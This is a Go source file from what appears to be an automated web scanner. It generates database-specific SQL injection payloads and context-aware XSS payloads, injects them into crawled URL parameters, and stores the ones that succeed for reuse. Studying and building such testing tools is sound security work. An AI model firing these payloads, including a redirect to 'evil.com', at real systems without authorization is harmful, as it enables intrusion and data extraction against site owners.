package scanner

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// PayloadMutator generates context-aware payloads and learns from responses
type PayloadMutator struct {
	http       *engine.HTTPClient
	successDB  map[string][]string // tech_stack -> successful payloads
	mu         sync.Mutex
	dbPath     string
}

func NewPayloadMutator(h *engine.HTTPClient) *PayloadMutator {
	pm := &PayloadMutator{
		http:      h,
		successDB: make(map[string][]string),
		dbPath:    filepath.Join(os.Getenv("HOME"), ".apex-autopilot", "payload_db.json"),
	}
	pm.load()
	return pm
}

// MutateSQLi generates SQLi payloads based on detected DB type and error feedback
func (pm *PayloadMutator) MutateSQLi(errorMsg string, context string) []string {
	var payloads []string

	// Detect DB from error
	switch {
	case strings.Contains(errorMsg, "mysql") || strings.Contains(errorMsg, "MariaDB"):
		payloads = append(payloads,
			"' OR 1=1-- -",
			"' UNION SELECT NULL,version(),NULL-- -",
			"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
			"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
			"' AND SLEEP(3)-- -",
		)
	case strings.Contains(errorMsg, "postgres") || strings.Contains(errorMsg, "pg_"):
		payloads = append(payloads,
			"' OR 1=1--",
			"'; SELECT version()--",
			"' AND 1=CAST((SELECT version()) AS int)--",
			"' AND (SELECT pg_sleep(3))--",
			"'||(SELECT version())||'",
		)
	case strings.Contains(errorMsg, "sqlite"):
		payloads = append(payloads,
			"' OR 1=1--",
			"' UNION SELECT NULL,sqlite_version(),NULL--",
			"' AND RANDOMBLOB(300000000)--", // time-based
		)
	case strings.Contains(errorMsg, "ORA-") || strings.Contains(errorMsg, "oracle"):
		payloads = append(payloads,
			"' OR 1=1--",
			"' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--",
			"' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
		)
	case strings.Contains(errorMsg, "mssql") || strings.Contains(errorMsg, "Microsoft"):
		payloads = append(payloads,
			"' OR 1=1--",
			"' UNION SELECT NULL,@@version,NULL--",
			"'; WAITFOR DELAY '0:0:3'--",
			"' AND 1=CONVERT(int,@@version)--",
		)
	default:
		// Generic - try all
		payloads = append(payloads,
			"' OR '1'='1",
			"' OR 1=1-- -",
			"\" OR 1=1-- -",
			"1' AND SLEEP(3)-- -",
			"1 AND 1=1",
			"1 UNION SELECT NULL--",
		)
	}

	// Add context-aware mutations
	if strings.Contains(context, "numeric") {
		payloads = append(payloads, "1 OR 1=1", "1 AND 1=2", "1 UNION SELECT NULL")
	}
	if strings.Contains(context, "json") {
		for i, p := range payloads {
			payloads[i] = strings.ReplaceAll(p, "'", "\\\"")
		}
	}

	// Add previously successful payloads for this context
	pm.mu.Lock()
	if prev, ok := pm.successDB["sqli"]; ok {
		payloads = append(prev, payloads...)
	}
	pm.mu.Unlock()

	return payloads
}

// MutateXSS generates context-aware XSS payloads
func (pm *PayloadMutator) MutateXSS(reflectionContext string) []string {
	switch {
	case strings.Contains(reflectionContext, "attr_double"):
		return []string{
			`" onfocus=alert(1) autofocus="`,
			`" onmouseover=alert(1) "`,
			`"><img src=x onerror=alert(1)>`,
			`" style="background:url(javascript:alert(1))"`,
		}
	case strings.Contains(reflectionContext, "attr_single"):
		return []string{
			`' onfocus=alert(1) autofocus='`,
			`' onmouseover=alert(1) '`,
			`'><img src=x onerror=alert(1)>`,
		}
	case strings.Contains(reflectionContext, "script"):
		return []string{
			`</script><script>alert(1)</script>`,
			`';alert(1)//`,
			`";alert(1)//`,
			`\";alert(1)//`,
			`'-alert(1)-'`,
		}
	case strings.Contains(reflectionContext, "html"):
		return []string{
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`<details open ontoggle=alert(1)>`,
			`<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`,
		}
	case strings.Contains(reflectionContext, "url"):
		return []string{
			`javascript:alert(1)`,
			`data:text/html,<script>alert(1)</script>`,
			`//evil.com`,
		}
	default:
		return []string{
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`"><svg onload=alert(1)>`,
			`'><img src=x onerror=alert(1)>`,
			`javascript:alert(1)`,
		}
	}
}

// DetectReflectionContext analyzes where input is reflected in the response
func (pm *PayloadMutator) DetectReflectionContext(h *engine.HTTPClient, targetURL, param string) string {
	canary := fmt.Sprintf("APEX%d", rand.Intn(99999))
	testURL := injectParam(targetURL, param, canary)
	resp := h.Get(testURL)
	if resp.Err != nil || !strings.Contains(resp.Body, canary) {
		return "none"
	}

	idx := strings.Index(resp.Body, canary)
	before := resp.Body[max(0, idx-100):idx]

	switch {
	case strings.Contains(before, "<script"):
		return "script"
	case strings.Contains(before, "=\"") || strings.Contains(before, "='"):
		if strings.Contains(before, "\"") {
			return "attr_double"
		}
		return "attr_single"
	case strings.Contains(before, "href=") || strings.Contains(before, "src="):
		return "url"
	default:
		return "html"
	}
}

// RecordSuccess stores a successful payload for future use
func (pm *PayloadMutator) RecordSuccess(vulnType, payload, techStack string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	key := vulnType
	if techStack != "" {
		key = vulnType + ":" + techStack
	}
	pm.successDB[key] = append(pm.successDB[key], payload)
	// Keep only last 50 per category
	if len(pm.successDB[key]) > 50 {
		pm.successDB[key] = pm.successDB[key][len(pm.successDB[key])-50:]
	}
	pm.save()
}

// scanAIPayloads uses the mutation engine for smarter scanning
func scanAIPayloads(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	pm := NewPayloadMutator(h)

	for u, params := range crawl.Params {
		for _, param := range params {
			// Step 1: Detect reflection context
			ctx := pm.DetectReflectionContext(h, u, param)
			if ctx == "none" {
				continue
			}

			// Step 2: Generate context-aware XSS payloads
			xssPayloads := pm.MutateXSS(ctx)
			for _, payload := range xssPayloads {
				testURL := injectParam(u, param, payload)
				resp := h.Get(testURL)
				if resp.Err != nil {
					continue
				}
				if strings.Contains(resp.Body, payload) {
					findings = append(findings, Finding{
						Type: "XSS (AI-Mutated)", Severity: "high",
						URL: testURL, Param: param, Payload: payload,
						Evidence: payload, Detail: fmt.Sprintf("Context: %s, payload reflected", ctx),
						Template: "apex-xss-ai",
					})
					pm.RecordSuccess("xss", payload, ctx)
					break
				}
			}

			// Step 3: SQLi with error feedback loop
			// First probe to get error
			probeURL := injectParam(u, param, "'")
			probeResp := h.Get(probeURL)
			if probeResp.Err != nil {
				continue
			}
			errorMsg := strings.ToLower(probeResp.Body)
			if containsSQLError(errorMsg) {
				// Generate DB-specific payloads
				sqliPayloads := pm.MutateSQLi(errorMsg, ctx)
				for _, payload := range sqliPayloads {
					testURL := injectParam(u, param, payload)
					resp := h.Get(testURL)
					if resp.Err != nil {
						continue
					}
					if isSQLiConfirmed(resp, probeResp) {
						findings = append(findings, Finding{
							Type: "SQL Injection (AI-Mutated)", Severity: "critical",
							URL: testURL, Param: param, Payload: payload,
							Detail: fmt.Sprintf("DB-specific payload succeeded after error analysis"),
							Template: "apex-sqli-ai",
						})
						pm.RecordSuccess("sqli", payload, "")
						break
					}
				}
			}
		}
	}
	return findings
}

func containsSQLError(body string) bool {
	errors := []string{"sql syntax", "mysql", "postgres", "sqlite", "ora-", "unclosed quotation", "quoted string not properly terminated", "syntax error"}
	for _, e := range errors {
		if strings.Contains(body, e) {
			return true
		}
	}
	return false
}

func isSQLiConfirmed(resp, baseline *engine.Response) bool {
	// Different status code
	if resp.StatusCode != baseline.StatusCode && resp.StatusCode == 200 {
		return true
	}
	// Significantly different response size (data extracted)
	if resp.Size > baseline.Size+500 {
		return true
	}
	// Contains version info
	versionRe := regexp.MustCompile(`\d+\.\d+\.\d+`)
	if versionRe.MatchString(resp.Body) && !versionRe.MatchString(baseline.Body) {
		return true
	}
	return false
}

func (pm *PayloadMutator) load() {
	data, err := os.ReadFile(pm.dbPath)
	if err != nil {
		return
	}
	json.Unmarshal(data, &pm.successDB)
}

func (pm *PayloadMutator) save() {
	os.MkdirAll(filepath.Dir(pm.dbPath), 0755)
	data, _ := json.Marshal(pm.successDB)
	os.WriteFile(pm.dbPath, data, 0644)
}
